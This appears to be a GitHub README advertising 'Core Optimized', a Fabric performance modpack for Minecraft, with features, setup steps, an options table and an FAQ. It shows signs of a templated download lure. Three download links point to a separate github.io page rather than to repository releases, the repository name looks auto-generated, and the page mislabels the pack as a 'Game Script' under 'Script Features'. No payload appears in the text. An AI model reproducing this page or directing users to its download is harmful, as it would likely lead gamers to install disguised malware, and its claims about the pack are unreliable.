# Core Optimized - Performance Modpack for Minecraft

> **A vanilla-focused Minecraft modpack built on Fabric that prioritizes performance optimization and quality-of-life improvements without altering the core gameplay experience.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/vogelmarco70/coreoptimized-win-13015?style=flat-square)](https://github.com/vogelmarco70/coreoptimized-win-13015)

---

<p align="center">
  <a href="https://vogelmarco70.github.io/coreoptimized-win-13015/">
    <img src="https://img.shields.io/badge/Download-Core%20Optimized%20Modpack-brightgreen?style=for-the-badge" alt="Download Core Optimized Modpack">
  </a>
</p>

> **[Direct Download - Core Optimized](https://vogelmarco70.github.io/coreoptimized-win-13015/)**

---

[Download Latest Build](https://vogelmarco70.github.io/coreoptimized-win-13015/)

---

## Overview

Core Optimized is a carefully curated modpack designed to enhance your Minecraft experience while preserving the authentic vanilla feel. Built on the Fabric mod loader, this pack focuses on delivering higher frame rates, reduced stuttering, and smoother chunk loading through proven optimization mods. Every addition has been selected to maintain the original game balance and aesthetics, making it ideal for players who want better performance without the bloat of content-heavy modpacks.

The pack also includes a selection of subtle quality-of-life improvements that streamline common tasks, from inventory management to world navigation. Resource packs are integrated to complement the visual style while further boosting performance. Regular updates ensure compatibility with the latest Minecraft releases and mod versions, keeping your experience stable and up to date.

---

## Script Features

- **Performance Optimization** – Enhanced frame rates and reduced lag through optimized rendering, memory management, and chunk loading algorithms
- **Vanilla-Like Experience** – Maintains the original game mechanics, progression, and visual style without introducing new blocks, items, or dimensions
- **Quality-of-Life Improvements** – Convenience tweaks for inventory sorting, tooltips, minimaps, and keybind customization
- **Stability Enhancements** – Crash fixes, memory leak prevention, and improved world loading reliability
- **Resource Pack Integration** – Lightweight texture and model optimizations that reduce GPU load while preserving vanilla aesthetics
- **Fabric Mod Loader** – Lightweight and fast modding framework with broad compatibility for the latest Minecraft versions
- **Contribution Friendly** – Open source and welcomes community contributions through Hacktoberfest and regular pull requests

---

## Setup

1. Download the latest modpack archive from the link above.
2. Install the Fabric mod loader for your Minecraft version.
3. Extract the modpack contents into your Minecraft `mods` folder.
4. Launch Minecraft using the Fabric profile.

Example folder structure:
```
.minecraft/
├── mods/
│   ├── coreoptimized-performance.jar
│   ├── coreoptimized-qol.jar
│   └── coreoptimized-resources.zip
└── resourcepacks/
    └── coreoptimized-textures.zip
```

---

## Options

| Setting | Default | Description |
|---------|---------|-------------|
| `enable_dynamic_lighting` | `true` | Toggle dynamic lighting effects from held items |
| `render_distance_boost` | `12` | Custom chunk render distance (4-32) |
| `smooth_fps_limit` | `144` | Frame rate cap (30-360) |
| `show_minimap` | `true` | Enable/disable minimap overlay |
| `auto_sort_inventory` | `false` | Automatically sort inventory on open |

Configuration can be adjusted in the `config/coreoptimized.toml` file.

---

## Compatibility

This modpack is designed for **Minecraft Java Edition** versions 1.20 and later, running on the **Fabric** mod loader. It is not compatible with Forge-based modpacks or OptiFine. Some mods may conflict with heavy content mods or world-editing tools. Performance gains vary depending on hardware specifications and existing system configuration.

---

## FAQ

**How do I install the modpack?**  
Follow the setup instructions above. Ensure you have the correct Fabric version installed for your Minecraft version.

**Will the modpack update automatically?**  
No, you will need to download new releases manually. Check the repository for update notifications.

**Can I add or remove mods?**  
Yes, the pack is modular. You can remove any mod you don't need, but be aware that performance may change.

**Is this compatible with multiplayer servers?**  
The modpack is client-side only. Most optimization mods work on servers, but some QoL features may require server-side mods.

**Where are my configuration files stored?**  
All settings are saved in the `config/` folder inside your Minecraft directory.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
